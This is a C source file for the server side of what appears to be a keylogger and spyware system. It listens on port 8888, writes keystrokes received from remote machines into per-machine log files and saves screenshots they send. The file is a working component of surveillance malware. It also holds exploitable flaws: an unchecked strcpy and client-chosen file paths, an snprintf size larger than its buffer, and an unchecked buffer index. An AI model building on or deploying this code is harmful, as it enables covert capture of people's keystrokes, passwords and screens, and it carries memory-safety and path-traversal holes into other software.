#include "serverManager.h"
#include "utils.h"
#include "constraints.h"
#include "messageManager.h"

#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>
#include <time.h>

extern clientHandler_t clientHndler;
extern task_queue_t taskQueue; // Coada de task-uri

void saveKeylog(int client_sock)
{
    char filename[BUFFER_SIZE];
    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
    {
        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt",
                 clientHndler.clientsAttr[client_sock].name,
                 clientHndler.clientsAttr[client_sock].name);
        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
        clientHndler.clientsAttr[client_sock].recordKeys = 0;

        char newFn[BUFFER_SIZE];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);

        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt",
                 clientHndler.clientsAttr[client_sock].name,
                 clientHndler.clientsAttr[client_sock].name,
                 timestamp);
        rename(filename, newFn);
    }

    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
    {
        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
        clientHndler.clientsAttr[client_sock].keylogger_fd = -1;
        clientHndler.clientsAttr[client_sock].recordKeys = 0;
    }
}

void handleOpcode(message_t msg, int clientSock)
{
    char filename[BUFFER_SIZE];
    switch (msg.opCode)
    {
    case 'K':
        if (strcmp(msg.buffer, "STOP") == 0)
        {
            saveKeylog(clientSock);
        }
        if (clientHndler.clientsAttr[clientSock].recordKeys)
        {
            // printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd,
            // msg.buffer, msg.size);
            if (write(clientHndler.clientsAttr[clientSock].keylogger_fd, msg.buffer, msg.size) == -1)
            {
                printf("ERROR WHEN WRITING TO %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd);
            }
        }
        break;

    case 'U':
        char *p = strtok(msg.buffer, " =\n");
        while (p)
        {
            if (strcmp(p, "Nume_Echipament") == 0)
            {
                p = strtok(NULL, "= \n");
                strcpy(clientHndler.clientsAttr[clientSock].name, p);
            }
            p = strtok(NULL, "= \n");
        }

        snprintf(filename, sizeof(filename), "%s/keylog%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name);

        mkdir(clientHndler.clientsAttr[clientSock].name, 0755);

        clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
        if (clientHndler.clientsAttr[clientSock].keylogger_fd == -1)
        {
            perror("Eroare la deschiderea fișierului de Keylog");
        }
        break;

    case 'S':
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);

        snprintf(filename, BUFFER_SIZE * 2, "%s/%s_%s.jpg", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name, timestamp);
        // printf("Primeste in fisierul %s\n", filename);
        fflush(0);
        recvFile(clientSock, filename);
        break;
    default:
        fflush(NULL);
        printf("WRONG OPCODE(%c) FROM %d\n", msg.opCode, clientSock);
        fflush(NULL);
        break;
    }
}

void *handle_client(void *params)
{
    while (1)
    {
        // Scoatem un task din coadă
        task_t task = dequeueTask(&taskQueue);

        int client_sock = task.client_sock;
        message_t client_message;
        int read_size;

        // Procesăm mesajele clientului
        while ((read_size = recv(client_sock, &client_message, sizeof(client_message), 0)) > 0)
        {
            client_message.buffer[client_message.size] = '\0';
            handleOpcode(client_message, client_sock);
        }

        // Salvăm fișierul de keylog (cod refactorizat într-o funcție separată)
        saveKeylog(client_sock);

        // Scoatem clientul din lista de clienți activi
        pthread_mutex_lock(&clientHndler.mutex);
        for (int i = 0; i < clientHndler.numberClients; i++)
        {
            if (clientHndler.socketsClients[i] == client_sock)
            {
                for (int j = i; j < clientHndler.numberClients - 1; j++)
                {
                    clientHndler.socketsClients[j] = clientHndler.socketsClients[j + 1];
                }
                clientHndler.numberClients--;
                break;
            }
        }
        pthread_mutex_unlock(&clientHndler.mutex);

        close(client_sock);
    }

    return NULL;
}

void sock_init(int *socket_desc, struct sockaddr_in *server)
{
    *socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (*socket_desc == -1)
    {
        perror("Could not create socket\n");
        exit(-1);
    }
    printf("Socket created\n");

    server->sin_family = AF_INET;
    server->sin_addr.s_addr = INADDR_ANY;
    server->sin_port = htons(8888);

    if (bind(*socket_desc, (struct sockaddr *)server, sizeof(*server)) < 0)
    {
        perror("Bind failed. Error");
        exit(-1);
    }
    printf("Bind done\n");

    if (listen(*socket_desc, 3) == -1)
    {
        perror("Listen failed. Error");
        exit(-1);
    }
}

void setZeroClientHandler(clientAttributes_t *clientAttr)
{
    strcpy(clientAttr->name, "");
    clientAttr->keylogger_fd = -1;
    clientAttr->recordKeys = 1;
}